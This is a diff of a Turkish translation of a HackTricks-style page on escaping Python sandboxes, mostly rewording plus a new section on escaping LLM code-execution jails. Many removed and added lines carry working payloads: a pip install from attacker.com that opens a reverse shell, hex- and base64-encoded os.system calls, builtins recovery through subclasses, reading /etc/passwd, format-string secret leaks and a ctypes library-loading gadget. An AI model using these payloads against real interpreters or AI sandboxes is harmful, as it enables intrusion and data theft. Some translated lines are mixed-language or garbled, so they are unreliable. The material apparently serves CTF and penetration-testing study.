@@ -1,4 +1,4 @@
-# Python sandboxes'ını atlatma
+# Python kumanda korumalarını aşma
 
 {% hint style="success" %}
 AWS Hacking'i öğrenin ve pratik yapın:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
@@ -15,7 +15,7 @@ GCP Hacking'i öğrenin ve pratik yapın: <img src="../../../.gitbook/assets/grt
 </details>
 {% endhint %}
 
-<figure><img src="/.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>
 
 **Web uygulamalarınız, ağınız ve bulutunuz hakkında bir hacker perspektifi edinin**
 
@@ -23,9 +23,7 @@ GCP Hacking'i öğrenin ve pratik yapın: <img src="../../../.gitbook/assets/grt
 
 {% embed url="https://pentest-tools.com/?utm_term=jul2024&utm_medium=link&utm_source=hacktricks&utm_campaign=spons" %}
 
-
-
-Bunlar, python sandbox korumalarını atlatmak ve keyfi komutlar çalıştırmak için bazı ipuçlarıdır.
+Python kumanda korumalarını aşmak ve keyfi komutlar çalıştırmak için bazı ipuçları şunlardır.
 
 ## Komut Çalıştırma Kütüphaneleri
 
@@ -102,12 +100,12 @@ Eğer `pip` veya `pip.main()` erişiminiz varsa, rastgele bir paketi yükleyebil
 pip install http://attacker.com/Rerverse.tar.gz
 pip.main(["install", "http://attacker.com/Rerverse.tar.gz"])
 ```
-Paketi ters shell oluşturmak için buradan indirebilirsiniz. Lütfen, kullanmadan önce **sıkıştırmayı açmalı, `setup.py` dosyasını değiştirmeli ve ters shell için IP'nizi girmelisiniz**:
+Buradan ters kabuk oluşturmak için paketi indirebilirsiniz. Lütfen, kullanmadan önce **paketi açtığınızdan, `setup.py` dosyasını değiştirdiğinizden ve ters kabuk için IP'nizi girdiğinizden emin olun**:
 
 {% file src="../../../.gitbook/assets/Reverse.tar (1).gz" %}
 
 {% hint style="info" %}
-Bu paket `Reverse` olarak adlandırılmıştır. Ancak, ters shell'den çıktığınızda kurulumun geri kalanının başarısız olması için özel olarak hazırlanmıştır, böylece **sunucuda ekstra bir python paketi bırakmazsınız**.
+Bu paket `Reverse` olarak adlandırılmıştır. Ancak, ters kabuktan çıktığınızda kurulumun geri kalanının başarısız olması için özel olarak hazırlanmıştır, böylece **sunucuda ekstra bir python paketi bırakmazsınız**.
 {% endhint %}
 
 ## Python kodunu Eval etmek
@@ -116,7 +114,7 @@ Bu paket `Reverse` olarak adlandırılmıştır. Ancak, ters shell'den çıktı�
 exec'in çok satırlı dizeleri ve ";" karakterini desteklediğini, ancak eval'in desteklemediğini unutmayın (walrus operatörüne bakın).
 {% endhint %}
 
-Belirli karakterler yasaksa, kısıtlamayı **bypass** etmek için **hex/oktal/B64** temsilini kullanabilirsiniz:
+Belirli karakterler yasaksa, kısıtlamayı **bypass** etmek için **hex/octal/B64** temsilini kullanabilirsiniz:
 ```python
 exec("print('RCE'); __import__('os').system('ls')") #Using ";"
 exec("print('RCE')\n__import__('os').system('ls')") #Using "\n"
@@ -137,7 +135,7 @@ exec("\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73\x
 exec('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='.decode("base64")) #Only python2
 exec(__import__('base64').b64decode('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='))
 ```
-### Python kodunu eval etmeye izin veren diğer kütüphaneler
+### Python kodunu değerlendirmeye izin veren diğer kütüphaneler
 ```python
 #Pandas
 import pandas as pd
@@ -162,7 +160,7 @@ df.query("@pd.annotations.__class__.__init__.__globals__['__builtins__']['eval']
 ```
 ## Bypass korumaları kodlamalar aracılığıyla (UTF-7)
 
-[**bu yazıda**](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy) UFT-7, görünüşte bir sandbox içinde rastgele python kodu yüklemek ve çalıştırmak için kullanılır:
+In [**this writeup**](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy) UFT-7, görünüşte bir sandbox içinde rastgele python kodu yüklemek ve çalıştırmak için kullanılır:
 ```python
 assert b"+AAo-".decode("utf_7") == "\n"
 
@@ -177,7 +175,7 @@ Aynı zamanda `raw_unicode_escape` ve `unicode_escape` gibi diğer kodlamaları 
 
 ## Çağrılar olmadan Python yürütmesi
 
-Eğer **çağrı yapmanıza izin vermeyen** bir python hapishanesindeyseniz, yine de **rastgele fonksiyonlar, kod** ve **komutlar** yürütmenin bazı yolları vardır.
+Eğer bir python hapishanesindeyseniz ve **çağrı yapmanıza izin verilmiyorsa**, yine de **rastgele fonksiyonları, kodları** ve **komutları** yürütmenin bazı yolları vardır.
 
 ### [Dekoratörler](https://docs.python.org/3/glossary.html#term-decorator) ile RCE
 ```python
@@ -203,11 +201,11 @@ class _:pass
 ```
 ### RCE nesneleri oluşturma ve aşırı yükleme
 
-Eğer bir **sınıf tanımlayabilir** ve o sınıfın bir **nesnesini oluşturabilirseniz**, **doğrudan çağırmaya gerek kalmadan** **tetiklenebilen** **farklı yöntemler yazabilir/aşırı yükleyebilirsiniz**.
+Eğer bir **sınıf tanımlayabilir** ve o sınıfın bir **nesnesini oluşturabilirseniz**, **doğrudan çağırmaya gerek kalmadan** **tetiklenebilen** **farklı yöntemler** **yazabilir/aşabilir**siniz.
 
-#### Özel sınıflarla RCE
+#### RCE özel sınıflarla
 
-Bazı **sınıf yöntemlerini** (_mevcut sınıf yöntemlerini aşırı yükleyerek veya yeni bir sınıf oluşturarak_) **doğrudan çağırmadan** **tetiklendiğinde** **rastgele kod çalıştıracak şekilde** değiştirebilirsiniz.
+Bazı **sınıf yöntemlerini** (_mevcut sınıf yöntemlerini aşarak veya yeni bir sınıf oluşturarak_) **tetiklendiğinde** **rastgele kod** **çalıştıracak** şekilde **değiştirebilirsiniz**.
 ```python
 # This class has 3 different ways to trigger RCE without directly calling any function
 class RCE:
@@ -259,7 +257,7 @@ __ixor__ (k ^= 'import os; os.system("sh")')
 ```
 #### [Metaclasslar](https://docs.python.org/3/reference/datamodel.html#metaclasses) ile nesneler oluşturma
 
-Metaclassların bize sağladığı en önemli şey, **bir sınıfın örneğini, yapıcıyı doğrudan çağırmadan** oluşturmak için hedef sınıfı metaclass olarak kullanarak yeni bir sınıf oluşturmaktır.
+Metaclassların bize sağladığı ana şey, **bir sınıfın örneğini, yapıcıyı** doğrudan çağırmadan, hedef sınıfı bir metaclass olarak kullanarak yeni bir sınıf oluşturmaktır.
 ```python
 # Code from https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/ and fixed
 # This will define the members of the "subclass"
@@ -276,7 +274,7 @@ Sub['import os; os.system("sh")']
 ```
 #### Hata ile nesne oluşturma
 
-Bir **hata tetiklendiğinde**, **Exception** nesnesi **oluşturulur** ve doğrudan yapıcıyı çağırmanıza gerek kalmaz (bir [**@\_nag0mez**](https://mobile.twitter.com/\_nag0mez) hilesi):
+Bir **hata tetiklendiğinde** bir **Exception** nesnesi **oluşturulur** ve doğrudan yapıcıyı çağırmanıza gerek kalmaz (bir [**@\_nag0mez**](https://mobile.twitter.com/\_nag0mez) hilesi):
 ```python
 class RCE(Exception):
 def __init__(self):
@@ -339,10 +337,10 @@ __builtins__.__dict__['__import__']("os").system("ls")
 ```
 ### No Builtins
 
-`__builtins__` yoksa, hiçbir şeyi içe aktaramayacak ve hatta dosyaları okuyup yazamayacaksınız çünkü **tüm global fonksiyonlar** (örneğin `open`, `import`, `print`...) **yüklenmemiştir**.\
-Ancak, **varsayılan olarak python birçok modülü belleğe yükler**. Bu modüller masum görünebilir, ancak bazıları **içlerinde tehlikeli** işlevsellikler de içermektedir ve bunlara erişilerek **keyfi kod yürütme** sağlanabilir.
+`__builtins__` yoksa, hiçbir şeyi içe aktaramayacak ve dosyaları okuyup yazamayacaksınız çünkü **tüm global fonksiyonlar** (örneğin `open`, `import`, `print`...) **yüklenmemiştir**.\
+Ancak, **varsayılan olarak python birçok modülü belleğe yükler**. Bu modüller masum görünebilir, ancak bazıları **içinde tehlikeli** işlevsellikler de içermektedir ve bunlara erişilerek **keyfi kod yürütme** sağlanabilir.
 
-Aşağıdaki örneklerde, bu "**masum**" modüllerin bazılarını **istismar** ederek içlerindeki **tehlikeli** **işlevselliklere** nasıl **erişileceğini** gözlemleyebilirsiniz.
+Aşağıdaki örneklerde, **tehlikeli** **işlevselliklere** **erişmek** için yüklenen bu "**masum**" modüllerden bazılarını nasıl **istismar** edeceğinizi gözlemleyebilirsiniz.
 
 **Python2**
 ```python
@@ -384,7 +382,7 @@ get_flag.__globals__['__builtins__']
 # Get builtins from loaded classes
 [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"]
 ```
-[**Aşağıda daha büyük bir fonksiyon var**](./#recursive-search-of-builtins-globals) **builtins**'leri bulabileceğiniz onlarla/**yüzlerce** **yer** bulmak için.
+[**Aşağıda daha büyük bir fonksiyon var**](./#recursive-search-of-builtins-globals) builtins'leri bulabileceğiniz onlarla/**yüzlerce** **yer** bulmak için.
 
 #### Python2 ve Python3
 ```python
@@ -392,7 +390,7 @@ get_flag.__globals__['__builtins__']
 __builtins__= [x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__
 __builtins__["__import__"]('os').system('ls')
 ```
-### Yerleşik yükler
+### Builtins yüklemeleri
 ```python
 # Possible payloads once you have found the builtins
 __builtins__["open"]("/etc/passwd").read()
@@ -426,9 +424,9 @@ class_obj.__init__.__globals__
 [ x for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__)]
 [<class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.FileFinder'>, <class 'zipimport.zipimporter'>, <class 'zipimport._ZipImportResourceReader'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'reprlib.Repr'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class 'sre_parse.State'>, <class 'sre_parse.SubPattern'>, <class 'sre_parse.Tokenizer'>, <class 're.Scanner'>, <class 'rlcompleter.Completer'>, <class 'dis.Bytecode'>, <class 'string.Template'>, <class 'cmd.Cmd'>, <class 'tokenize.Untokenizer'>, <class 'inspect.BlockFinder'>, <class 'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>, <class 'bdb.Bdb'>, <class 'bdb.Breakpoint'>, <class 'traceback.FrameSummary'>, <class 'traceback.TracebackException'>, <class '__future__._Feature'>, <class 'codeop.Compile'>, <class 'codeop.CommandCompiler'>, <class 'code.InteractiveInterpreter'>, <class 'pprint._safe_key'>, <class 'pprint.PrettyPrinter'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 'threading._RLock'>, <class 'threading.Condition'>, <class 'threading.Semaphore'>, <class 'threading.Event'>, <class 'threading.Barrier'>, <class 'threading.Thread'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>]
 ```
-[**Aşağıda daha büyük bir fonksiyon var**](./#recursive-search-of-builtins-globals) yüzlerce/**onlarca** **yer** bulmak için **globals**.
+[**Aşağıda daha büyük bir fonksiyon bulunmaktadır**](./#recursive-search-of-builtins-globals) yüzlerce/**onlarca** **yer** bulmak için **globals**.
 
-## Keyfi İcraatı Keşfet
+## Keyfi İcraatı Keşfetme
 
 Burada, **daha tehlikeli işlevsellikleri** kolayca keşfetmeyi ve daha güvenilir istismarlar önermeyi açıklamak istiyorum.
 
@@ -712,12 +710,12 @@ Not edin ki **niteliklere** normal bir şekilde **nokta** ile `people_obj.__init
 
 Ayrıca, bir nesnenin elemanlarını listelemek için `.__dict__` kullanabileceğinizi unutmayın `get_name_for_avatar("{people_obj.__init__.__globals__[os].__dict__}", people_obj = people)`.
 
-Format dizelerinin bazı diğer ilginç özellikleri, belirtilen nesnede **`str`**, **`repr`** ve **`ascii`** **fonksiyonlarını** sırasıyla **`!s`**, **`!r`**, **`!a`** ekleyerek **çalıştırma** olanağıdır:
+Format dizelerinin bazı diğer ilginç özellikleri, belirtilen nesnede **`str`**, **`repr`** ve **`ascii`** fonksiyonlarını **`!s`**, **`!r`**, **`!a`** ekleyerek **çalıştırma** olanağıdır:
 ```python
 st = "{people_obj.__init__.__globals__[CONFIG][KEY]!a}"
 get_name_for_avatar(st, people_obj = people)
 ```
-Ayrıca, sınıflarda **yeni formatlayıcılar kodlamak** mümkündür:
+Ayrıca, sınıflarda **yeni formatlayıcılar** kodlamak mümkündür:
 ```python
 class HAL9000(object):
 def __format__(self, format):
@@ -731,14 +729,14 @@ return 'HAL 9000'
 **Daha fazla örnek** hakkında **format** **string** örnekleri [**https://pyformat.info/**](https://pyformat.info) adresinde bulunabilir.
 
 {% hint style="danger" %}
-Ayrıca, Python iç nesnelerinden hassas bilgileri **okuyacak** gadget'lar için aşağıdaki sayfayı kontrol edin:
+Ayrıca, Python iç nesnelerinden hassas bilgileri **okuyacak** aletler için aşağıdaki sayfayı kontrol edin:
 {% endhint %}
 
 {% content-ref url="../python-internal-read-gadgets.md" %}
 [python-internal-read-gadgets.md](../python-internal-read-gadgets.md)
 {% endcontent-ref %}
 
-### Hassas Bilgi Sızdırma Yükleri
+### Hassas Bilgi Sızdırma Payload'ları
 ```python
 {whoami.__class__.__dict__}
 {whoami.__globals__[os].__dict__}
@@ -754,18 +752,22 @@ secret_variable = "clueless"
 x = new_user.User(username='{i.find.__globals__[so].mapperlib.sys.modules[__main__].secret_variable}',password='lol')
 str(x) # Out: clueless
 ```
-### Format'tan RCE'ye kütüphaneleri yükleme
+### LLM Jails bypass
 
-[**Bu yazıdan TypeMonkey chall'a göre**](https://corgi.rip/posts/buckeye-writeups/) python'da format string zafiyetini kötüye kullanarak diskten rastgele kütüphaneler yüklemek mümkündür.
+From [here](https://www.cyberark.com/resources/threat-research-blog/anatomy-of-an-llm-rce): `().class.base.subclasses()[108].load_module('os').system('dir')`
 
-Hatırlatma olarak, python'da her bir işlem gerçekleştirildiğinde bir fonksiyon çalıştırılır. Örneğin `2*3` **`(2).mul(3)`** veya **`{'a':'b'}['a']`** **`{'a':'b'}.__getitem__('a')`** olarak çalıştırılacaktır.
+### From format to RCE loading libraries
 
-Buna benzer daha fazlasını [**Python çağrısız yürütme**](./#python-execution-without-calls) bölümünde bulabilirsiniz.
+According to the [**TypeMonkey chall from this writeup**](https://corgi.rip/posts/buckeye-writeups/) it's possible to load arbitrary libraries from disk abusing the format string vulnerability in python.
 
-Bir python format string zafiyeti, fonksiyon çalıştırmaya izin vermez (parantez kullanmaya izin vermez), bu nedenle `'{0.system("/bin/sh")}'.format(os)` gibi RCE elde etmek mümkün değildir.\
-Ancak, `[]` kullanmak mümkündür. Bu nedenle, yaygın bir python kütüphanesi **`__getitem__`** veya **`__getattr__`** metodu varsa ve bu metot rastgele kod çalıştırıyorsa, bunları kötüye kullanarak RCE elde etmek mümkündür.
+Hatırlatma olarak, python'da her bir işlem gerçekleştirildiğinde bazı fonksiyonlar çalıştırılır. Örneğin `2*3` **`(2).mul(3)`** veya **`{'a':'b'}['a']`** **`{'a':'b'}.__getitem__('a')`** olarak çalıştırılacaktır.
 
-Python'da böyle bir gadget ararken, yazı bu [**Github arama sorgusunu**](https://github.com/search?q=repo%3Apython%2Fcpython+%2Fdef+%28\_\_getitem\_\_%7C\_\_getattr\_\_%29%2F+path%3ALib%2F+-path%3ALib%2Ftest%2F\&type=code) öneriyor. Burada bu [birini](https://github.com/python/cpython/blob/43303e362e3a7e2d96747d881021a14c7f7e3d0b/Lib/ctypes/\_\_init\_\_.py#L463) buldu:
+Bunun gibi daha fazlasını [**Python execution without calls**](./#python-execution-without-calls) bölümünde bulabilirsiniz.
+
+Bir python format string açığı, fonksiyon çalıştırılmasına izin vermez (parantez kullanılmasına izin vermez), bu nedenle `'{0.system("/bin/sh")}'.format(os)` gibi RCE elde etmek mümkün değildir.\
+Ancak, `[]` kullanmak mümkündür. Bu nedenle, yaygın bir python kütüphanesi **`__getitem__`** veya **`__getattr__`** metoduna sahipse ve bu metodlar rastgele kod çalıştırıyorsa, RCE elde etmek için bunları istismar etmek mümkündür.
+
+Python'da böyle bir gadget ararken, yazım bu [**Github arama sorgusunu**](https://github.com/search?q=repo%3Apython%2Fcpython+%2Fdef+%28\_\_getitem\_\_%7C\_\_getattr\_\_%29%2F+path%3ALib%2F+-path%3ALib%2Ftest%2F\&type=code) öneriyor. Burada bu [birini](https://github.com/python/cpython/blob/43303e362e3a7e2d96747d881021a14c7f7e3d0b/Lib/ctypes/\_\_init\_\_.py#L463) buldu:
 ```python
 class LibraryLoader(object):
 def __init__(self, dlltype):
@@ -787,7 +789,7 @@ return getattr(self, name)
 cdll = LibraryLoader(CDLL)
 pydll = LibraryLoader(PyDLL)
 ```
-Bu cihaz, **diskten bir kütüphane yüklemeye** olanak tanır. Bu nedenle, saldırıya uğrayan sunucuya doğru bir şekilde derlenmiş **yüklemek için kütüphaneyi yazmak veya yüklemek** gerekmektedir.
+Bu alet, **diskten bir kütüphane yüklemeye** olanak tanır. Bu nedenle, saldırıya uğrayan sunucuya **doğru bir şekilde derlenmiş kütüphaneyi yazmak veya yüklemek** gerekmektedir.
 ```python
 '{i.find.__globals__[so].mapperlib.sys.modules[ctypes].cdll[/path/to/file]}'
 ```
@@ -812,7 +814,7 @@ return "THIS-IS-THE-FALG!"
 else:
 return "Nope"
 ```
-#### dizin
+#### dir
 ```python
 dir() #General dir() to find what we have loaded
 ['__builtins__', '__doc__', '__name__', '__package__', 'b', 'bytecode', 'code', 'codeobj', 'consts', 'dis', 'filename', 'foo', 'get_flag', 'names', 'read', 'x']
@@ -960,9 +962,9 @@ return calc_flag("VjkuKuVjgHnci")
 else:
 return "Nope"
 ```
-### Creating the code object
+### Kod nesnesi oluşturma
 
-Öncelikle, **bir kod nesnesi nasıl oluşturulur ve çalıştırılır** bilmemiz gerekiyor, böylece sızdırdığımız fonksiyonu çalıştırmak için bir tane oluşturabiliriz:
+Öncelikle, **bir kod nesnesinin nasıl oluşturulup çalıştırılacağını** bilmemiz gerekiyor, böylece sızdırılan fonksiyonumuzu çalıştırmak için bir tane oluşturabiliriz:
 ```python
 code_type = type((lambda: None).__code__)
 # Check the following hint if you get an error in calling this
@@ -982,7 +984,7 @@ mydict['__builtins__'] = __builtins__
 function_type(code_obj, mydict, None, None, None)("secretcode")
 ```
 {% hint style="info" %}
-Kullanmakta olduğunuz python sürümüne bağlı olarak `code_type`'ın **parametreleri** **farklı bir sıraya** sahip olabilir. Çalıştırdığınız python sürümündeki parametrelerin sırasını öğrenmenin en iyi yolu:
+Kullandığınız python sürümüne bağlı olarak `code_type`'ın **parametreleri** **farklı bir sıraya** sahip olabilir. Kullandığınız python sürümündeki parametrelerin sırasını öğrenmenin en iyi yolu:
 ```
 import types
 types.CodeType.__doc__
@@ -993,7 +995,7 @@ types.CodeType.__doc__
 ### Sızdırılmış bir fonksiyonu yeniden oluşturma
 
 {% hint style="warning" %}
-Aşağıdaki örnekte, fonksiyonu doğrudan fonksiyon kodu nesnesinden yeniden oluşturmak için gereken tüm verileri alacağız. **Gerçek bir örnekte**, fonksiyonu çalıştırmak için gereken tüm **değerler** **sızdırmanız gerekenlerdir**.
+Aşağıdaki örnekte, fonksiyonu yeniden oluşturmak için gereken tüm verileri doğrudan fonksiyon kodu nesnesinden alacağız. **Gerçek bir örnekte**, fonksiyonu çalıştırmak için gereken tüm **değerler** **sızdırmanız gereken** **`code_type`** olacaktır.
 {% endhint %}
 ```python
 fc = get_flag.__code__
@@ -1007,7 +1009,7 @@ function_type(code_obj, mydict, None, None, None)("secretcode")
 ```
 ### Bypass Defenses
 
-Bu gönderinin başındaki önceki örneklerde, **`compile` fonksiyonunu kullanarak herhangi bir python kodunu nasıl çalıştıracağınızı** görebilirsiniz. Bu ilginç çünkü **döngüler ve her şeyle birlikte tam betikleri** bir **tek satırda** çalıştırabilirsiniz (ve aynı şeyi **`exec`** kullanarak da yapabiliriz).\
+Bu yazının başındaki önceki örneklerde, **`compile` fonksiyonunu kullanarak herhangi bir python kodunu nasıl çalıştıracağınızı** görebilirsiniz. Bu ilginç çünkü **döngüler ve her şeyle birlikte tam scriptleri** bir **tek satırda** çalıştırabilirsiniz (ve aynı şeyi **`exec`** kullanarak da yapabiliriz).\
 Her neyse, bazen bir **derlenmiş nesne** oluşturmak ve bunu **CTF makinesinde** çalıştırmak faydalı olabilir (örneğin, CTF'de `compiled` fonksiyonuna sahip olmadığımız için).
 
 Örneğin, _./poc.py_ dosyasını okuyan bir fonksiyonu manuel olarak derleyip çalıştıralım:
@@ -1037,7 +1039,7 @@ mydict['__builtins__'] = __builtins__
 codeobj = code_type(0, 0, 3, 64, bytecode, consts, names, (), 'noname', '<module>', 1, '', (), ())
 function_type(codeobj, mydict, None, None, None)()
 ```
-Eğer `eval` veya `exec` erişiminiz yoksa, **doğru bir fonksiyon** oluşturabilirsiniz, ancak doğrudan çağırmak genellikle şu hata ile sonuçlanacaktır: _constructor restricted mode'da erişilebilir değil_. Bu nedenle, bu fonksiyonu çağırmak için **kısıtlı ortamda olmayan bir fonksiyona** ihtiyacınız var.
+Eğer `eval` veya `exec` erişiminiz yoksa, **uygun bir fonksiyon** oluşturabilirsiniz, ancak doğrudan çağırmak genellikle şu hata ile sonuçlanacaktır: _constructor restricted modda erişilebilir değil_. Bu nedenle, bu fonksiyonu çağırmak için **kısıtlı ortamda olmayan bir fonksiyona** ihtiyacınız var.
 ```python
 #Compile a regular print
 ftype = type(lambda: None)
@@ -1080,7 +1082,7 @@ bypass edilecektir
 * [https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html](https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html)
 * [https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6](https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6)
 
-<figure><img src="/.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>
 
 **Web uygulamalarınız, ağınız ve bulutunuz hakkında bir hacker perspektifi edinin**
 
